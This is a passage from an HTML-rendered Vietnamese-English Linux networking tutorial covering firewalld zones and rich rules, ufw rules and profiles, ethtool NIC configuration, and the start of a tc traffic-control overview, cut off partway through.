</span></span><span class=line><span class=cl>└─────────────────────────────────────────────────────────────┘
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Timeline:
</span></span><span class=line><span class=cl><span class=k>-</span> ipchains (Linux 2.2, 1999) → Deprecated
</span></span><span class=line><span class=cl><span class=k>-</span> iptables (Linux 2.4, 2001) → Still common, being phased out
</span></span><span class=line><span class=cl><span class=k>-</span> nftables (Linux 3.13, 2014) → Replacement for iptables
</span></span><span class=line><span class=cl><span class=k>-</span> firewalld/ufw → High-level wrappers
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>┌────────────────────────────────────────────────────────────┐
</span></span><span class=line><span class=cl>│                     User Space                             │
</span></span><span class=line><span class=cl>│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐    │
</span></span><span class=line><span class=cl>│  │ iptables │  │ firewalld│  │   ufw    │  │ nft      │    │
</span></span><span class=line><span class=cl>│  │ (cmd)    │  │ (daemon) │  │ (cmd)    │  │ (cmd)    │    │
</span></span><span class=line><span class=cl>│  └────┬─────┘  └────┬─────┘  └────┬─────┘  └────┬─────┘    │
</span></span><span class=line><span class=cl>│       │             │             │             │          │
</span></span><span class=line><span class=cl>│       │     ┌───────▼───────┐     │             │          │
</span></span><span class=line><span class=cl>│       │     │ firewalld can │     │             │          │
</span></span><span class=line><span class=cl>│       │     │ use iptables  │     │             │          │
</span></span><span class=line><span class=cl>│       │     │ or nftables   │     │             │          │
</span></span><span class=line><span class=cl>│       │     │ as backend    │     │             │          │
</span></span><span class=line><span class=cl>│       │     └───────┬───────┘     │             │          │
</span></span><span class=line><span class=cl>│       │             │             │             │          │
</span></span><span class=line><span class=cl>│       └─────────────┼─────────────┼─────────────┘          │
</span></span><span class=line><span class=cl>│                     │             │                        │
</span></span><span class=line><span class=cl>│              ┌──────▼─────────────▼──────┐                 │
</span></span><span class=line><span class=cl>│              │iptables-nft / nft commands│                 │
</span></span><span class=line><span class=cl>│              └──────────────┬────────────┘                 │
</span></span><span class=line><span class=cl>└─────────────────────────────│──────────────────────────────┘
</span></span><span class=line><span class=cl>                              │
</span></span><span class=line><span class=cl>┌─────────────────────────────│──────────────────────────────┐
</span></span><span class=line><span class=cl>│                             │ Kernel Space                 │
</span></span><span class=line><span class=cl>│                     ┌───────▼───────┐                      │
</span></span><span class=line><span class=cl>│                     │   nf_tables   │ ← Netfilter subsystem│
</span></span><span class=line><span class=cl>│                     │   (kernel)    │                      │
</span></span><span class=line><span class=cl>│                     └───────────────┘                      │
</span></span><span class=line><span class=cl>└────────────────────────────────────────────────────────────┘
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Recommendations:
</span></span><span class=line><span class=cl><span class=k>-</span> RHEL/CentOS/Fedora: firewalld (default)
</span></span><span class=line><span class=cl><span class=k>-</span> Ubuntu/Debian: ufw (simple) hoặc firewalld
</span></span><span class=line><span class=cl><span class=k>-</span> Advanced users: nftables trực tiếp
</span></span><span class=line><span class=cl>- Legacy systems: iptables (still works)</span></span></code></pre></div><h3 class=heading-element id=132-firewalld-rhelcentosfedora><span>13.2 firewalld (RHEL/CentOS/Fedora)</span>
<a href=#132-firewalld-rhelcentosfedora class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># firewalld = Dynamic firewall manager</span>
</span></span><span class=line><span class=cl><span class=c1># - Zone-based: Gán interface/source vào zones</span>
</span></span><span class=line><span class=cl><span class=c1># - Service-based: Predefined rules cho common services</span>
</span></span><span class=line><span class=cl><span class=c1># - Runtime vs Permanent: Thay đổi ngay hoặc sau reboot</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Zones (từ trusted nhất đến untrusted nhất):</span>
</span></span><span class=line><span class=cl><span class=c1># trusted    - Accept all</span>
</span></span><span class=line><span class=cl><span class=c1># home       - Trusted home network</span>
</span></span><span class=line><span class=cl><span class=c1># internal   - Internal networks</span>
</span></span><span class=line><span class=cl><span class=c1># work       - Work network</span>
</span></span><span class=line><span class=cl><span class=c1># public     - Public networks (default)</span>
</span></span><span class=line><span class=cl><span class=c1># external   - External networks (masquerading)</span>
</span></span><span class=line><span class=cl><span class=c1># dmz        - DMZ</span>
</span></span><span class=line><span class=cl><span class=c1># block      - Reject all incoming</span>
</span></span><span class=line><span class=cl><span class=c1># drop       - Drop all incoming (no response)</span></span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Status</span>
</span></span><span class=line><span class=cl>firewall-cmd --state
</span></span><span class=line><span class=cl>systemctl status firewalld
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Reload (apply permanent changes)</span>
</span></span><span class=line><span class=cl>firewall-cmd --reload
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># List all</span>
</span></span><span class=line><span class=cl>firewall-cmd --list-all
</span></span><span class=line><span class=cl>firewall-cmd --list-all-zones
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Zone operations</span>
</span></span><span class=line><span class=cl>firewall-cmd --get-default-zone
</span></span><span class=line><span class=cl>firewall-cmd --set-default-zone<span class=o>=</span>public
</span></span><span class=line><span class=cl>firewall-cmd --get-active-zones
</span></span><span class=line><span class=cl>firewall-cmd --get-zones
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Assign interface to zone</span>
</span></span><span class=line><span class=cl>firewall-cmd --zone<span class=o>=</span>public --change-interface<span class=o>=</span>eth0
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># List services in zone</span>
</span></span><span class=line><span class=cl>firewall-cmd --zone<span class=o>=</span>public --list-services
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Add service</span>
</span></span><span class=line><span class=cl>firewall-cmd --zone<span class=o>=</span>public --add-service<span class=o>=</span>http              <span class=c1># Runtime only</span>
</span></span><span class=line><span class=cl>firewall-cmd --zone<span class=o>=</span>public --add-service<span class=o>=</span>http --permanent  <span class=c1># Persistent</span>
</span></span><span class=line><span class=cl>firewall-cmd --reload                                       <span class=c1># Apply permanent</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Remove service</span>
</span></span><span class=line><span class=cl>firewall-cmd --zone<span class=o>=</span>public --remove-service<span class=o>=</span>http --permanent
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># List available services</span>
</span></span><span class=line><span class=cl>firewall-cmd --get-services
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Add port directly</span>
</span></span><span class=line><span class=cl>firewall-cmd --zone<span class=o>=</span>public --add-port<span class=o>=</span>8080/tcp --permanent
</span></span><span class=line><span class=cl>firewall-cmd --zone<span class=o>=</span>public --add-port<span class=o>=</span>5000-5010/tcp --permanent   <span class=c1># Range</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Remove port</span>
</span></span><span class=line><span class=cl>firewall-cmd --zone<span class=o>=</span>public --remove-port<span class=o>=</span>8080/tcp --permanent
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Add rich rule (complex rules)</span>
</span></span><span class=line><span class=cl>firewall-cmd --zone<span class=o>=</span>public --add-rich-rule<span class=o>=</span><span class=s1>&#39;rule family=&#34;ipv4&#34; source address=&#34;192.168.1.0/24&#34; service name=&#34;ssh&#34; accept&#39;</span> --permanent
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Reject from specific IP</span>
</span></span><span class=line><span class=cl>firewall-cmd --zone<span class=o>=</span>public --add-rich-rule<span class=o>=</span><span class=s1>&#39;rule family=&#34;ipv4&#34; source address=&#34;10.0.0.100&#34; reject&#39;</span> --permanent
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Rate limiting</span>
</span></span><span class=line><span class=cl>firewall-cmd --zone<span class=o>=</span>public --add-rich-rule<span class=o>=</span><span class=s1>&#39;rule service name=&#34;ssh&#34; limit value=&#34;3/m&#34; accept&#39;</span> --permanent
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Port forwarding</span>
</span></span><span class=line><span class=cl>firewall-cmd --zone<span class=o>=</span>public --add-forward-port<span class=o>=</span><span class=nv>port</span><span class=o>=</span>80:proto<span class=o>=</span>tcp:toport<span class=o>=</span><span class=m>8080</span> --permanent
</span></span><span class=line><span class=cl>firewall-cmd --zone<span class=o>=</span>public --add-forward-port<span class=o>=</span><span class=nv>port</span><span class=o>=</span>80:proto<span class=o>=</span>tcp:toaddr<span class=o>=</span>192.168.1.100:toport<span class=o>=</span><span class=m>80</span> --permanent
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Masquerading (NAT)</span>
</span></span><span class=line><span class=cl>firewall-cmd --zone<span class=o>=</span>public --add-masquerade --permanent
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Direct rules (iptables syntax)</span>
</span></span><span class=line><span class=cl>firewall-cmd --direct --add-rule ipv4 filter INPUT <span class=m>0</span> -p tcp --dport <span class=m>9999</span> -j ACCEPT</span></span></code></pre></div><h3 class=heading-element id=133-ufw-ubuntudebian><span>13.3 ufw (Ubuntu/Debian)</span>
<a href=#133-ufw-ubuntudebian class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># ufw = Uncomplicated Firewall</span>
</span></span><span class=line><span class=cl><span class=c1># - Wrapper cho iptables</span>
</span></span><span class=line><span class=cl><span class=c1># - Simple syntax</span>
</span></span><span class=line><span class=cl><span class=c1># - Profile-based (application profiles)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Enable/Disable</span>
</span></span><span class=line><span class=cl>ufw <span class=nb>enable</span>
</span></span><span class=line><span class=cl>ufw disable
</span></span><span class=line><span class=cl>ufw status
</span></span><span class=line><span class=cl>ufw status verbose
</span></span><span class=line><span class=cl>ufw status numbered           <span class=c1># Show rule numbers</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Default policies</span>
</span></span><span class=line><span class=cl>ufw default deny incoming
</span></span><span class=line><span class=cl>ufw default allow outgoing
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Allow/Deny by port</span>
</span></span><span class=line><span class=cl>ufw allow <span class=m>22</span>                  <span class=c1># Allow SSH</span>
</span></span><span class=line><span class=cl>ufw allow 80/tcp              <span class=c1># Allow HTTP</span>
</span></span><span class=line><span class=cl>ufw allow 443/tcp             <span class=c1># Allow HTTPS</span>
</span></span><span class=line><span class=cl>ufw deny <span class=m>3306</span>                 <span class=c1># Deny MySQL</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Allow by service name (from /etc/services)</span>
</span></span><span class=line><span class=cl>ufw allow ssh
</span></span><span class=line><span class=cl>ufw allow http
</span></span><span class=line><span class=cl>ufw allow https
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Allow from specific IP</span>
</span></span><span class=line><span class=cl>ufw allow from 192.168.1.100
</span></span><span class=line><span class=cl>ufw allow from 192.168.1.100 to any port <span class=m>22</span>
</span></span><span class=line><span class=cl>ufw allow from 192.168.1.0/24 to any port <span class=m>22</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Allow to specific IP (outgoing)</span>
</span></span><span class=line><span class=cl>ufw allow out to 8.8.8.8
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Deny from specific IP</span>
</span></span><span class=line><span class=cl>ufw deny from 10.0.0.100
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Port range</span>
</span></span><span class=line><span class=cl>ufw allow 5000:5010/tcp
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Delete rules</span>
</span></span><span class=line><span class=cl>ufw delete allow 80/tcp
</span></span><span class=line><span class=cl>ufw delete <span class=m>3</span>                  <span class=c1># Delete rule number 3</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Reset to defaults</span>
</span></span><span class=line><span class=cl>ufw reset
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Application profiles</span>
</span></span><span class=line><span class=cl>ufw app list
</span></span><span class=line><span class=cl>ufw app info <span class=s1>&#39;Apache Full&#39;</span>
</span></span><span class=line><span class=cl>ufw allow <span class=s1>&#39;Apache Full&#39;</span>
</span></span><span class=line><span class=cl>ufw allow <span class=s1>&#39;OpenSSH&#39;</span>
</span></span><span class=line><span class=cl>ufw allow <span class=s1>&#39;Nginx Full&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Logging</span>
</span></span><span class=line><span class=cl>ufw logging on
</span></span><span class=line><span class=cl>ufw logging medium            <span class=c1># low, medium, high, full</span>
</span></span><span class=line><span class=cl><span class=c1># Logs: /var/log/ufw.log</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Insert rule at specific position</span>
</span></span><span class=line><span class=cl>ufw insert <span class=m>1</span> deny from 10.0.0.100
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Rate limiting (brute force protection)</span>
</span></span><span class=line><span class=cl>ufw limit ssh                 <span class=c1># Max 6 connections in 30 seconds</span>
</span></span><span class=line><span class=cl>ufw limit 22/tcp</span></span></code></pre></div><h3 class=heading-element id=134-ufw-application-profiles><span>13.4 ufw Application Profiles</span>
<a href=#134-ufw-application-profiles class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Profile location: /etc/ufw/applications.d/</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Example: /etc/ufw/applications.d/myapp</span>
</span></span><span class=line><span class=cl><span class=o>[</span>MyApp<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=nv>title</span><span class=o>=</span>My Custom Application
</span></span><span class=line><span class=cl><span class=nv>description</span><span class=o>=</span>My application server
</span></span><span class=line><span class=cl><span class=nv>ports</span><span class=o>=</span>8080/tcp<span class=p>|</span>8443/tcp
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Reload profiles</span>
</span></span><span class=line><span class=cl>ufw app update MyApp
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Use profile</span>
</span></span><span class=line><span class=cl>ufw allow <span class=s1>&#39;MyApp&#39;</span></span></span></code></pre></div><hr><h2 class=heading-element id=phần-14-ethtool---nic-configuration><span>PHẦN 14: ETHTOOL - NIC CONFIGURATION</span>
<a href=#ph%e1%ba%a7n-14-ethtool---nic-configuration class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><h3 class=heading-element id=141-nic-information><span>14.1 NIC Information</span>
<a href=#141-nic-information class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Xem NIC settings</span>
</span></span><span class=line><span class=cl>ethtool eth0
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Output:</span>
</span></span><span class=line><span class=cl><span class=c1># Settings for eth0:</span>
</span></span><span class=line><span class=cl><span class=c1>#     Supported ports: [ TP ]</span>
</span></span><span class=line><span class=cl><span class=c1>#     Supported link modes:   10baseT/Half 10baseT/Full</span>
</span></span><span class=line><span class=cl><span class=c1>#                             100baseT/Half 100baseT/Full</span>
</span></span><span class=line><span class=cl><span class=c1>#                             1000baseT/Full</span>
</span></span><span class=line><span class=cl><span class=c1>#     Supported pause frame use: Symmetric</span>
</span></span><span class=line><span class=cl><span class=c1>#     Supports auto-negotiation: Yes</span>
</span></span><span class=line><span class=cl><span class=c1>#     Supported FEC modes: Not reported</span>
</span></span><span class=line><span class=cl><span class=c1>#     Advertised link modes:  10baseT/Half 10baseT/Full</span>
</span></span><span class=line><span class=cl><span class=c1>#                             100baseT/Half 100baseT/Full</span>
</span></span><span class=line><span class=cl><span class=c1>#                             1000baseT/Full</span>
</span></span><span class=line><span class=cl><span class=c1>#     Advertised pause frame use: Symmetric</span>
</span></span><span class=line><span class=cl><span class=c1>#     Advertised auto-negotiation: Yes</span>
</span></span><span class=line><span class=cl><span class=c1>#     Speed: 1000Mb/s</span>
</span></span><span class=line><span class=cl><span class=c1>#     Duplex: Full</span>
</span></span><span class=line><span class=cl><span class=c1>#     Auto-negotiation: on</span>
</span></span><span class=line><span class=cl><span class=c1>#     Port: Twisted Pair</span>
</span></span><span class=line><span class=cl><span class=c1>#     PHYAD: 1</span>
</span></span><span class=line><span class=cl><span class=c1>#     Transceiver: internal</span>
</span></span><span class=line><span class=cl><span class=c1>#     MDI-X: off (auto)</span>
</span></span><span class=line><span class=cl><span class=c1>#     Supports Wake-on: pumbg</span>
</span></span><span class=line><span class=cl><span class=c1>#     Wake-on: g</span>
</span></span><span class=line><span class=cl><span class=c1>#     Link detected: yes</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Driver info</span>
</span></span><span class=line><span class=cl>ethtool -i eth0
</span></span><span class=line><span class=cl><span class=c1># driver: e1000</span>
</span></span><span class=line><span class=cl><span class=c1># version: 7.3.21-k8-NAPI</span>
</span></span><span class=line><span class=cl><span class=c1># firmware-version:</span>
</span></span><span class=line><span class=cl><span class=c1># bus-info: 0000:00:03.0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Statistics</span>
</span></span><span class=line><span class=cl>ethtool -S eth0
</span></span><span class=line><span class=cl><span class=c1># NIC statistics:</span>
</span></span><span class=line><span class=cl><span class=c1>#      rx_packets: 1234567</span>
</span></span><span class=line><span class=cl><span class=c1>#      tx_packets: 7654321</span>
</span></span><span class=line><span class=cl><span class=c1>#      rx_bytes: 123456789</span>
</span></span><span class=line><span class=cl><span class=c1>#      tx_bytes: 987654321</span>
</span></span><span class=line><span class=cl><span class=c1>#      rx_errors: 0</span>
</span></span><span class=line><span class=cl><span class=c1>#      tx_errors: 0</span>
</span></span><span class=line><span class=cl><span class=c1>#      rx_dropped: 0</span>
</span></span><span class=line><span class=cl><span class=c1>#      tx_dropped: 0</span></span></span></code></pre></div><h3 class=heading-element id=142-nic-configuration><span>14.2 NIC Configuration</span>
<a href=#142-nic-configuration class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Set speed and duplex (disable auto-negotiation first)</span>
</span></span><span class=line><span class=cl>ethtool -s eth0 autoneg off speed <span class=m>100</span> duplex full
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Enable auto-negotiation</span>
</span></span><span class=line><span class=cl>ethtool -s eth0 autoneg on
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Wake-on-LAN</span>
</span></span><span class=line><span class=cl>ethtool -s eth0 wol g         <span class=c1># Enable (g = magic packet)</span>
</span></span><span class=line><span class=cl>ethtool -s eth0 wol d         <span class=c1># Disable</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Ring buffer sizes (performance tuning)</span>
</span></span><span class=line><span class=cl>ethtool -g eth0               <span class=c1># Show current</span>
</span></span><span class=line><span class=cl>ethtool -G eth0 rx <span class=m>4096</span> tx <span class=m>4096</span>   <span class=c1># Set</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Offload features</span>
</span></span><span class=line><span class=cl>ethtool -k eth0               <span class=c1># Show offload settings</span>
</span></span><span class=line><span class=cl>ethtool -K eth0 tso on        <span class=c1># TCP Segmentation Offload</span>
</span></span><span class=line><span class=cl>ethtool -K eth0 gso on        <span class=c1># Generic Segmentation Offload</span>
</span></span><span class=line><span class=cl>ethtool -K eth0 gro on        <span class=c1># Generic Receive Offload</span>
</span></span><span class=line><span class=cl>ethtool -K eth0 tx-checksum-ipv4 on
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Interrupt coalescing (latency vs throughput tradeoff)</span>
</span></span><span class=line><span class=cl>ethtool -c eth0               <span class=c1># Show current</span>
</span></span><span class=line><span class=cl>ethtool -C eth0 rx-usecs <span class=m>100</span>  <span class=c1># Set RX interrupt delay</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Test link</span>
</span></span><span class=line><span class=cl>ethtool -p eth0 <span class=m>5</span>             <span class=c1># Blink LED for 5 seconds</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Permanent settings: NetworkManager hoặc /etc/network/interfaces</span></span></span></code></pre></div><hr><h2 class=heading-element id=phần-15-tc---traffic-control><span>PHẦN 15: TC - TRAFFIC CONTROL</span>
<a href=#ph%e1%ba%a7n-15-tc---traffic-control class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><h3 class=heading-element id=151-traffic-control-concepts><span>15.1 Traffic Control Concepts</span>
<a href=#151-traffic-control-concepts class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-markdown data-lang=markdown><span class=line><span class=cl>┌─────────────────────────────────────────────────────────────┐
</span></span><span class=line><span class=cl>│                 TRAFFIC CONTROL ARCHITECTURE                │
</span></span><span class=line><span class=cl>└─────────────────────────────────────────────────────────────┘
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>tc = Traffic Control for QoS (Quality of Service)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>┌──────────────────────────────────────────────────────────┐
</span></span><span class=line><span class=cl>│                    Egress (outgoing)                     │
</span></span><span class=line><span class=cl>│                                                          │
</span></span><span class=line><span class=cl>│  Application                                             │
</span></span><span class=line><span class=cl>│      │                                                   │
</span></span><span class=line><span class=cl>│      ▼                                                   │
</span></span><span class=line><span class=cl>│  ┌─────────┐     ┌──────────┐     ┌──────────┐           │
</span></span><span class=line><span class=cl>│  │ Filter  │────►│ Classes  │────►│  Qdisc   │──► NIC    │
</span></span><span class=line><span class=cl>│  │(classify)│    │(buckets) │     │(scheduler)│          │
</span></span><span class=line><span class=cl>│  └─────────┘     └──────────┘     └──────────┘           │
</span></span><span class=line><span class=cl>│                                                          │
</span></span><span class=line><span class=cl>└──────────────────────────────────────────────────────────┘
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Components:
</span></span><span class=line><span class=cl><span class=k>-</span> Qdisc (Queuing Discipline): Thuật toán scheduling
</span></span><span class=line><span class=cl><span class=k>-</span> Classes: Phân loại traffic
</span></span><span class=line><span class=cl><span class=k>-</span> Filters: Match và classify packets
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Common qdiscs:
</span></span><span class=line><span class=cl><span class=k>-</span> pfifo_fast: Default, 3 bands priority queue
</span></span><span class=line><span class=cl><span class=k>-</span> tbf: Token Bucket Filter (rate limiting)
</span></span><span class=line><span class=cl><span class=k>-</span> htb: Hierarchical Token Bucket (complex QoS)
